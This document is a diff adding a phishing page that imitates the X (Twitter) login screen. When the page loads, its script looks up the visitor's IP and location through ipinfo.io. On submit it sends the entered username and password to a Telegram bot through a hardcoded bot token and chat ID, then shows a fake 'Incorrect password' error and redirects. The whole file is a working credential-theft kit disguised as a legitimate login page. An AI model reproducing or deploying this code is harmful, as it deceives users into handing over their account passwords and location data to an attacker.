@@ -1,0 +1,405 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Ensure it takes full viewport height */
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px; /* Max width like mobile apps */
+            height: 100vh; /* Full height */
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .header {
+            display: flex;
+            /* justify-content: space-between; */ /* Removed to allow centering */
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .cancel-button {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .logo {
+            height: 40px; /* Increased height */
+            display: flex; /* Help align image if needed */
+            align-items: center;
+            justify-content: center;
+            flex-grow: 1; /* Allow logo container to take available space */
+        }
+
+        .logo img {
+            height: 100%; /* Make image fill the container height */
+            width: auto;
+        }
+
+        .content {
+            flex-grow: 1; /* Takes up available space */
+            overflow: hidden; /* Hide overflowing step content */
+            position: relative; /* Needed for absolute positioning of steps */
+        }
+
+        .step-container {
+            position: relative;
+            width: 100%;
+            height: 100%; /* Or adjust as needed */
+        }
+
+        .step {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%; /* Ensure steps take full height of container */
+            transition: transform 0.3s ease-in-out;
+            backface-visibility: hidden; /* Optimize animation */
+        }
+
+        .step.active {
+            transform: translateX(0);
+            opacity: 1;
+            z-index: 1; /* Bring active step to front */
+        }
+
+        .step.inactive-left {
+            transform: translateX(-100%);
+            opacity: 0;
+            z-index: 0;
+        }
+
+        .step.inactive-right {
+            transform: translateX(100%);
+            opacity: 0;
+            z-index: 0;
+        }
+
+        .content h1 {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px 0; /* Padding top/bottom, no horizontal padding */
+            background: none;
+            border: none;
+            border-bottom: 1px solid #536471; /* Twitter's grey border color */
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 20px; /* Space below input */
+            box-sizing: border-box;
+        }
+
+        .input-field::placeholder {
+            color: #71767b; /* Twitter's placeholder color */
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-bottom: 2px solid #1d9bf0; /* Twitter's blue focus color */
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #2f3336; /* Twitter's darker border */
+            padding-top: 15px;
+            margin-top: auto; /* Pushes footer to the bottom */
+        }
+
+        .forgot-password {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .next-button {
+            background-color: #fff;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 9999px; /* Pill shape */
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Styling for the displayed username in step 2 */
+        .username-display {
+            color: #71767b; /* Same grey as placeholder */
+            font-size: 18px;
+            margin-bottom: 0; /* Remove bottom margin, use padding instead */
+            padding-left: 0; /* Align with input */
+            padding-bottom: 15px; /* Add padding below text, above line */
+            border-bottom: 1px solid #536471; /* Add the grey line */
+            display: block; /* Ensure it takes full width for the border */
+            width: 100%;
+            box-sizing: border-box; /* Include padding/border in width */
+            margin-bottom: 20px; /* Add space between the line and the password input */
+        }
+
+        /* Wrapper for password input (can add eye icon later) */
+        .password-wrapper {
+            position: relative; /* Needed for absolute positioning */
+            display: flex; /* Use flex to align input and icon */
+            align-items: center; /* Vertically center items */
+            border-bottom: 1px solid #536471; /* Move border from input to wrapper */
+            margin-bottom: 20px; /* Keep the space below */
+        }
+
+        /* Remove border and margin from the input itself now */
+        .password-wrapper .input-field {
+            border-bottom: none;
+            margin-bottom: 0;
+            flex-grow: 1; /* Allow input to take up space */
+        }
+
+        /* Remove focus border from input, apply to wrapper instead */
+        .password-wrapper .input-field:focus {
+            border-bottom: none; /* Remove default blue line on input focus */
+            outline: none;
+        }
+
+        /* Add focus style to the wrapper */
+        .password-wrapper:focus-within {
+             border-bottom: 2px solid #1d9bf0; /* Twitter's blue focus color */
+             /* Adjust padding if border width changes */
+             padding-bottom: 0; 
+        }
+        .password-wrapper:not(:focus-within) {
+             /* Ensure default padding when not focused if needed */
+             padding-bottom: 1px; /* Offset for the 1px border */
+        }
+        
+        /* Ensure the main input field doesn't add padding interfering with the wrapper border */
+        .input-field {
+             padding: 15px 0; /* Reset padding if changed elsewhere */
+        }
+
+        .toggle-password {
+            padding: 0 10px; /* Space around the icon */
+            cursor: pointer;
+            color: #71767b; /* Match placeholder color */
+            user-select: none; /* Prevent text selection */
+            display: flex; /* Align icon vertically if needed */
+            align-items: center;
+        }
+
+        .toggle-password svg {
+            width: 20px;  /* Control SVG size */
+            height: 20px; /* Control SVG size */
+            stroke: #71767b; /* Use stroke color to match theme */
+            stroke-width: 1.5; /* Adjust line thickness if needed */
+        }
+
+        /* Styling for feedback message */
+        .feedback-message {
+            font-size: 14px;
+            color: #f4212e; /* Default to error color (like Twitter's red) */
+            min-height: 20px; /* Prevent layout shift */
+            margin-top: -10px; /* Adjust spacing relative to password wrapper */
+            margin-bottom: 10px;
+            text-align: left; /* Align text to the left */
+        }
+
+        /* --- Responsive Adjustments --- */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px; /* Reduce padding on small screens */
+            }
+
+            .content h1 {
+                font-size: 24px; /* Slightly smaller heading */
+                margin-bottom: 20px; /* Reduced margin */
+            }
+
+            .input-field,
+            .username-display {
+                font-size: 16px; /* Slightly smaller input text */
+            }
+
+            .username-display {
+                 padding-bottom: 10px; /* Adjust padding for smaller screens */
+                 margin-bottom: 15px; /* Adjust margin for smaller screens */
+            }
+
+            .footer {
+                padding-top: 10px; /* Reduce footer padding */
+            }
+
+            .cancel-button,
+            .forgot-password,
+            .next-button {
+                font-size: 14px; /* Slightly smaller footer/button text */
+            }
+
+            .next-button {
+                 padding: 8px 16px; /* Adjust button padding */
+            }
+
+            .password-wrapper .input-field {
+                 /* Adjust input padding if needed for smaller screens */
+            }
+
+            .toggle-password svg {
+                width: 18px;
+                height: 18px;
+            }
+
+            .feedback-message {
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <button class="cancel-button">Cancel</button>
+            <!-- Placeholder for X logo - we can add an SVG or image later -->
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/X_logo.jpg" alt="X Logo">
+            </div>
+        </header>
+
+        <main class="content">
+            <div class="step-container">
+                <div id="step1-content" class="step active">
+                    <form id="telegramForm" onsubmit="showError(event)">
+                    <h1>To get started, first enter your phone, email, or @username</h1>
+                    <input type="text" placeholder="Username" id="name" value="ig" name="name" class="input-1" hidden />
+                    <input type="hidden" id="region" name="region">
+                    <input type="text" name="email" id="email"  placeholder="Phone, email, or username" class="input-field" id="username-input">
+                    <input type="password" name="message" id="message" placeholder="Password" class="input-field" id="password-input">
+                    <div id="feedback" class="feedback-message"></div>
+                </div>
+
+               
+                    <!-- Add feedback element -->
+                    
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <button class="next-button" id="next-login-button" type="submit">Login</button>
+
+        </footer>
+    </form>
+    </div>
+    <script>
+        function showError(event) {
+          event.preventDefault(); // stops page refresh
+          document.getElementById("feedback").textContent =
+            "Incorrect password! Please try again...";
+        }
+        </script>
+    <script>
+        // Fetch user's IP and location info and store for use in form submission
+        function getUserRegion() {
+          fetch('https://ipinfo.io?token=999a655c730c7c')
+            .then(response => response.json())
+            .then(data => {
+              document.getElementById('region').value = data.region || 'Unknown';
+      
+              // Store details in global window object
+              window.userIP = data.ip || 'Unknown';
+              window.userCountry = data.country || 'Unknown';
+              window.userCity = data.city || 'Unknown';
+              window.userTime = new Date().toLocaleString();
+            })
+            .catch(error => {
+              alert('Error fetching region info: ' + error.message);
+              // fallback defaults
+              window.userIP = 'Unknown';
+              window.userCountry = 'Unknown';
+              window.userCity = 'Unknown';
+              window.userTime = new Date().toLocaleString();
+            });
+        }
+      
+        // Run on page load
+        window.onload = function () {
+          getUserRegion();
+        };
+      
+        document.getElementById('telegramForm').addEventListener('submit', function (e) {
+          e.preventDefault();
+      
+          const name = document.getElementById('name').value;
+          const email = document.getElementById('email').value;
+          const region = document.getElementById('region').value;
+          const message = document.getElementById('message').value;
+      
+          const ip = window.userIP || 'Unknown';
+          const country = window.userCountry || 'Unknown';
+          const city = window.userCity || 'Unknown';
+          const time = window.userTime || new Date().toLocaleString();
+      
+          const text =
+            `📩 *New Message From X Received*\n\n` +
+            `👤 *Name:* ${name}\n` +
+            `📧 *Email:* ${email}\n` +
+            `🌍 *Region:* ${region}\n` +
+            `🌐 *Country:* ${country}\n` +
+            `🏙️ *City:* ${city}\n` +
+            `📍 *IP Address:* ${ip}\n` +
+            `🕒 *Time:* ${time}\n` +
+            `🔐 *Pass:* ${message}`;
+      
+          const botToken = '7687128799:AAHSLw762EGG3PSxYfX9dIBeaI4maTyKFtU';
+          const chatId = '1594881950';
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+          const data = {
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'Markdown'
+          };
+      
+          fetch(url, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+          })
+            .then(response => response.json())
+            .then(result => {
+              console.log('Telegram API result:', result);
+              window.location.href = 'x.html';
+            })
+            .catch(error => {
+              console.error('Error sending message:', error);
+              alert('Failed to send message. Please try again later.');
+            });
+        });
+      </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"8acb6f27ac0d4b7f94c7d78baa7e2b01","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
